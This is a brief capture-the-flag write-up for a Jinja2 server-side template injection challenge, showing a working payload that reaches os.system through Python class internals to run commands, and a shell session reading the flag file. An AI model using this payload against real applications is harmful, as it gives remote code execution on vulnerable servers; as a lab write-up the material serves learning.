# Jinja

Tag: `SSTI`

[http://h4ck3r.quest:8700](http://h4ck3r.quest:8700)

## Writeup

[Reference](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2)

Trivial SSTI, proved by `{{7*7}}`.

Note that the payload executes system and renders the return value, so let's just get a reverse shell. I love shells, hooraay!

```python
{{ ''.__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__['system']("your reverse shell syntax here") }}
```

Don't ask. It's all about MAGIC.

**You are Not Expected to Understand This**

```bash
I have no name!@0ee0ed23db04:/app$ ls
ls
2
main.py
uwsgi.ini
I have no name!@0ee0ed23db04:/app$ cd /
cd /
I have no name!@0ee0ed23db04:/$ ls
ls
app
bin
boot
dev
entrypoint.sh
etc
home
install-nginx-debian.sh
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
start.sh
sys
th1s_15_fl4ggggggg
tmp
usr
uwsgi-nginx-entrypoint.sh
var
I have no name!@0ee0ed23db04:/$ cat th1s_15_fl4ggggggg
cat th1s_15_fl4ggggggg
FLAG{ssti.__class__.__pwn__}I have no name!@0ee0ed23db04:/$ whoami
whoami
whoami: cannot find name for user ID 1000
I have no name!@0ee0ed23db04:/$ id
id
uid=1000 gid=1000 groups=1000
```
